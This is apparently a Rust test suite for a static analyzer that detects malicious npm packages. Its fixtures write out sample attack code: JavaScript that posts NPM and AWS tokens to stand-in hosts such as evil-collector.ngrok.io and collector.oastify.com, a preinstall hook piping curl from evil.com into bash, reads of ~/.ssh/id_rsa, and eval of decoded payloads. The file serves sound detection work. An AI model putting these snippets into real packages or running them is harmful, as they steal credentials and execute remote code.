//! Tests for oath-analyze static analysis engine
//!
//! Tests against:
//! 1. Synthetic malicious patterns (known attack vectors)
//! 2. Real npm packages extracted to disk
//! 3. Known-malicious package patterns (ua-parser-js style, event-stream style)

use oath_analyze::{Analyzer, FindingKind, PackageScanner, RiskLevel};
use std::fs;
use std::path::Path;
use tempfile::TempDir;

// ---- UNIT TESTS: individual pattern detection ----

fn analyze(source: &str) -> Vec<oath_analyze::Finding> {
    let mut a = Analyzer::new(source.to_string(), "test.js".to_string());
    a.analyze().unwrap();
    a.findings
}

#[test]
fn detects_require_child_process() {
    let findings = analyze(
        r#"
        const cp = require('child_process');
        cp.exec('ls -la', (err, stdout) => console.log(stdout));
    "#,
    );
    assert!(
        findings.iter().any(|f| f.kind == FindingKind::Subprocess),
        "Should detect child_process require"
    );
}

#[test]
fn non_ascii_source_near_buffer_from_does_not_panic() {
    // Regression: the Buffer.from detector sliced a fixed +80-byte window, which
    // could land inside a multi-byte UTF-8 char and panic (seen on real malware
    // with Turkish comments). Reaching the assertion = it returned without panic.
    let findings = analyze(
        "const x = Buffer.from(data, 'base64'); // parçalı veri çözme işlemi ığüşöç çalışır\nconsole.log(x);",
    );
    let _ = findings;
}

#[test]
fn detects_eval() {
    let findings = analyze(
        r#"
        const code = Buffer.from('Y29uc29sZS5sb2coJ3B3bmVkJyk=', 'base64').toString();
        eval(code);
    "#,
    );
    assert!(
        findings.iter().any(|f| f.kind == FindingKind::DynamicExec),
        "Should detect eval()"
    );
    assert!(
        findings.iter().any(|f| f.kind == FindingKind::Obfuscation),
        "Should detect Buffer.from base64 obfuscation"
    );
}

#[test]
fn detects_process_env() {
    let findings = analyze(
        r#"
        const token = process.env.NPM_TOKEN;
        const key = process.env.AWS_SECRET_ACCESS_KEY;
    "#,
    );
    assert!(
        findings.iter().any(|f| f.kind == FindingKind::EnvAccess),
        "Should detect process.env access"
    );
    assert!(
        findings
            .iter()
            .any(|f| f.kind == FindingKind::EnvAccess && f.risk >= RiskLevel::High),
        "Should flag sensitive env vars as high risk"
    );
}

#[test]
fn detects_network_access() {
    let findings = analyze(
        r#"
        const https = require('https');
        https.get('https://evil.com/collect?data=' + token, () => {});
    "#,
    );
    assert!(
        findings.iter().any(|f| f.kind == FindingKind::Network),
        "Should detect https require"
    );
}

#[test]
fn detects_exfiltration_combo() {
    // The ua-parser-js style attack: collect env vars, POST to attacker
    let findings = analyze(
        r#"
        const https = require('https');
        const env = process.env;
        const data = JSON.stringify({
            npm: process.env.NPM_TOKEN,
            aws: process.env.AWS_SECRET_ACCESS_KEY,
            home: process.env.HOME
        });
        const req = https.request({
            hostname: 'evil-collector.ngrok.io',
            method: 'POST',
            path: '/collect'
        });
        req.write(data);
        req.end();
    "#,
    );
    assert!(
        findings.iter().any(|f| f.kind == FindingKind::Network),
        "Should detect network"
    );
    assert!(
        findings.iter().any(|f| f.kind == FindingKind::EnvAccess),
        "Should detect env access"
    );
    // ngrok exfil domain
    assert!(
        findings
            .iter()
            .any(|f| f.kind == FindingKind::DataExfiltration),
        "Should detect ngrok exfiltration domain"
    );
}

#[test]
fn detects_dormant_exfiltration_payloads() {
    let findings = analyze(
        r#"
        function activateOnlyAfterPublish() {
            const https = require('https');
            const token = process.env.NPM_TOKEN;
            https.request({ hostname: 'collector.invalid', method: 'POST' }).end(token);
        }
        module.exports = activateOnlyAfterPublish;
    "#,
    );
    assert!(
        findings
            .iter()
            .any(|finding| finding.kind == FindingKind::Network)
    );
    assert!(
        findings
            .iter()
            .any(|finding| finding.kind == FindingKind::EnvAccess)
    );
}

#[test]
fn detects_delayed_string_execution_payloads() {
    let findings = analyze(
        r#"
        setTimeout("require('https').get('https://collector.invalid/?t=' + process.env.NPM_TOKEN)", 600000);
    "#,
    );
    assert!(
        findings
            .iter()
            .any(|finding| finding.kind == FindingKind::DynamicExec)
    );
    assert!(
        findings
            .iter()
            .any(|finding| finding.kind == FindingKind::EnvAccess)
    );
}

#[test]
fn detects_new_function_dynamic_exec() {
    let findings = analyze(
        r#"
        // Obfuscated dynamic execution via new Function
        const fn = new Function('return process.env');
        fn();
    "#,
    );
    assert!(
        findings.iter().any(|f| f.kind == FindingKind::DynamicExec),
        "Should detect new Function()"
    );
}

#[test]
fn clean_package_is_clean() {
    // A totally clean utility function -- should have no high-risk findings
    let findings = analyze(
        r#"
        'use strict';
        function add(a, b) { return a + b; }
        function multiply(a, b) { return a * b; }
        module.exports = { add, multiply };
    "#,
    );
    assert!(
        !findings.iter().any(|f| f.risk >= RiskLevel::High),
        "Simple utility should not have high-risk findings, got: {:?}",
        findings
            .iter()
            .filter(|f| f.risk >= RiskLevel::High)
            .collect::<Vec<_>>()
    );
}

#[test]
fn detects_decode_then_execute() {
    // Adversarial cases (from the scanner red-team): a decode primitive feeding
    // straight into a code-exec sink. These must be Critical even though
    // atob/charcode/Buffer.from on their own are only Info. This exercises the
    // string scanner (detect_advanced_obfuscation), the path perms/score/install
    // actually use -- not the AST Analyzer that `analyze()` drives.
    for src in [
        r#"eval(atob("cmVxdWlyZSgnY2hpbGRfcHJvY2Vzcycp"));"#,
        r#"const m = require(String.fromCharCode(102,115));"#,
        "const fn = new Function(Buffer.from(blob, 'base64').toString());",
    ] {
        let findings = oath_analyze::scanner::detect_advanced_obfuscation(src, "test.js");
        assert!(
            findings
                .iter()
                .any(|f| f.kind == FindingKind::DynamicExec && f.risk >= RiskLevel::High),
            "decode-then-execute must be high/critical, src: {src}\n got: {:?}",
            findings
        );
    }
}

#[test]
fn web_framework_is_not_high_risk() {
    // Reproduces the express false positive: reading NODE_ENV in an HTTP server
    // that defines app.get/app.post and uses Buffer.from must NOT be flagged as
    // exfiltration or obfuscation. (express used to score F / HIGH on this.)
    let findings = analyze(
        r#"
        const http = require('http');
        const fs = require('fs');
        const env = process.env.NODE_ENV || 'development';
        app.get('/', (req, res) => res.send(Buffer.from('hello')));
        app.post('/data', (req, res) => res.send('ok'));
        switch (c) { case 0x3c: break; }
    "#,
    );
    assert!(
        !findings
            .iter()
            .any(|f| f.kind == FindingKind::DataExfiltration),
        "NODE_ENV + http server must not be flagged as exfiltration"
    );
    assert!(
        !findings.iter().any(|f| f.risk >= RiskLevel::High),
        "A normal web handler should have no high-risk findings, got: {:?}",
        findings
            .iter()
            .filter(|f| f.risk >= RiskLevel::High)
            .collect::<Vec<_>>()
    );
}

#[test]
fn detects_vm_runinnewcontext() {
    let findings = analyze(
        r#"
        const vm = require('vm');
        const sandbox = { secret: process.env.SECRET_KEY };
        vm.runInNewContext(code, sandbox);
    "#,
    );
    assert!(
        findings.iter().any(|f| f.kind == FindingKind::DynamicExec),
        "Should detect vm.runInNewContext"
    );
}

#[test]
fn detects_install_script_in_package_json() {
    let dir = TempDir::new().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "preinstall": "curl https://evil.com/payload.sh | bash"
        }
    }"#,
    )
    .unwrap();
    fs::write(dir.path().join("index.js"), r#"module.exports = {};"#).unwrap();

    let report = PackageScanner::scan("evil-pkg", "1.0.0", dir.path()).unwrap();
    assert!(
        report.capabilities.has_install_scripts,
        "Should detect install script"
    );
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.kind == FindingKind::InstallScript),
        "Should have install script finding"
    );
}

#[test]
fn scanner_detects_fs_access() {
    let dir = TempDir::new().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{"name":"test","version":"1.0.0"}"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("index.js"),
        r#"
        const fs = require('fs');
        const home = require('os').homedir();
        fs.readFileSync(home + '/.ssh/id_rsa', 'utf8');
    "#,
    )
    .unwrap();

    let report = PackageScanner::scan("test", "1.0.0", dir.path()).unwrap();
    assert!(report.capabilities.filesystem, "Should detect fs access");
    assert!(
        report.findings.iter().any(|f| f.risk >= RiskLevel::High),
        "Reading ~/.ssh/id_rsa should be high risk"
    );
    println!("Scanner findings: {:#?}", report.findings);
}

#[test]
fn scanner_does_not_correlate_unrelated_files() {
    let dir = TempDir::new().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{"name":"auth-client","version":"1.0.0"}"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("token.js"),
        r#"module.exports = process.env.DEPLOY_TOKEN;"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("client.js"),
        r#"module.exports = (url) => fetch(url);"#,
    )
    .unwrap();

    let report = PackageScanner::scan("auth-client", "1.0.0", dir.path()).unwrap();
    assert_eq!(report.overall_risk, RiskLevel::Info);
    assert!(report.capabilities.env_access);
    assert!(report.capabilities.network);
}

#[test]
fn scanner_still_flags_correlated_exfiltration() {
    let dir = TempDir::new().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{"name":"stealer","version":"1.0.0"}"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("index.js"),
        r#"
        const token = process.env.NPM_TOKEN;
        fetch("https://collector.oastify.com", { method: "POST", body: token });
        "#,
    )
    .unwrap();

    let report = PackageScanner::scan("stealer", "1.0.0", dir.path()).unwrap();
    assert_eq!(report.overall_risk, RiskLevel::Critical);
    assert!(!report.verdict_reasons.is_empty());
}

#[test]
fn scanner_analyzes_executable_test_and_fixture_sources() {
    let dir = TempDir::new().unwrap();
    fs::create_dir_all(dir.path().join("fixtures")).unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{"name":"fixture-payload","version":"1.0.0"}"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("fixtures/payload.test.js"),
        r#"
        const token = process.env.NPM_TOKEN;
        fetch("https://collector.oastify.com", { method: "POST", body: token });
        "#,
    )
    .unwrap();

    let report = PackageScanner::scan("fixture-payload", "1.0.0", dir.path()).unwrap();
    assert_eq!(report.files_scanned, 1);
    assert_eq!(report.overall_risk, RiskLevel::Critical);
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.file == "fixtures/payload.test.js")
    );
}

#[test]
fn scanner_analyzes_sources_larger_than_500_kilobytes() {
    let dir = TempDir::new().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{"name":"large-payload","version":"1.0.0"}"#,
    )
    .unwrap();
    let mut source = "// padding\n".repeat(50_001);
    source.push_str(
        r#"
        const token = process.env.NPM_TOKEN;
        fetch("https://collector.oastify.com", { method: "POST", body: token });
        "#,
    );
    assert!(source.len() > 500_000);
    fs::write(dir.path().join("bundle.js"), source).unwrap();

    let report = PackageScanner::scan("large-payload", "1.0.0", dir.path()).unwrap();
    assert_eq!(report.files_scanned, 1);
    assert_eq!(report.overall_risk, RiskLevel::Critical);
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.kind == FindingKind::DataExfiltration)
    );
}

#[test]
fn scanner_marks_parser_failures_as_incomplete_review() {
    let dir = TempDir::new().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{"name":"broken-source","version":"1.0.0"}"#,
    )
    .unwrap();
    fs::write(dir.path().join("index.js"), "function broken( {").unwrap();

    let report = PackageScanner::scan("broken-source", "1.0.0", dir.path()).unwrap();
    assert_eq!(report.overall_risk, RiskLevel::High);
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.kind == FindingKind::AnalysisIncomplete)
    );
    assert!(
        report
            .verdict_reasons
            .iter()
            .any(|reason| reason.contains("analysis incomplete"))
    );
}

#[test]
fn scanner_marks_invalid_utf8_source_as_incomplete_and_still_scans_it() {
    let dir = TempDir::new().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{"name":"binary-source","version":"1.0.0"}"#,
    )
    .unwrap();
    let mut source = b"const value = process.env.NPM_TOKEN;\n".to_vec();
    source.push(0xff);
    source.extend_from_slice(b"\nmodule.exports = value;\n");
    fs::write(dir.path().join("index.js"), source).unwrap();

    let report = PackageScanner::scan("binary-source", "1.0.0", dir.path()).unwrap();
    assert_eq!(report.files_scanned, 1);
    assert_eq!(report.overall_risk, RiskLevel::High);
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.kind == FindingKind::AnalysisIncomplete)
    );
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.kind == FindingKind::EnvAccess)
    );
}

// ---- REAL PACKAGE TEST: scan express from node_modules ----

#[test]
fn scan_real_express_package() {
    // Use the express we already installed in /tmp/oath-express
    let express_dir =
        Path::new("/tmp/oath-express/node_modules/.oath/express@4.18.2/node_modules/express");
    if !express_dir.exists() {
        println!(
            "Skipping: express not installed at {}",
            express_dir.display()
        );
        return;
    }

    let report = PackageScanner::scan("express", "4.18.2", express_dir).unwrap();
    println!(
        "express analysis: {} files, {} lines",
        report.files_scanned, report.lines_scanned
    );
    println!("overall risk: {}", report.overall_risk);
    println!(
        "capabilities: network={} fs={} env={} subprocess={} dynexec={}",
        report.capabilities.network,
        report.capabilities.filesystem,
        report.capabilities.env_access,
        report.capabilities.subprocess,
        report.capabilities.dynamic_exec,
    );
    for f in &report.findings {
        println!("  [{:?}] {} L{}: {}", f.risk, f.kind, f.line, f.message);
        if let Some(s) = &f.snippet {
            println!("    {s}");
        }
    }

    // express is a web framework -- it DOES use http, path, etc.
    // Should NOT be Critical. Should not have subprocess or eval.
    assert!(
        report.overall_risk < RiskLevel::High,
        "express should not be High risk, got {}",
        report.overall_risk
    );
    assert!(
        !report.capabilities.dynamic_exec,
        "express should not use dynamic exec"
    );
    assert!(
        !report.capabilities.subprocess,
        "express should not spawn subprocesses"
    );
}
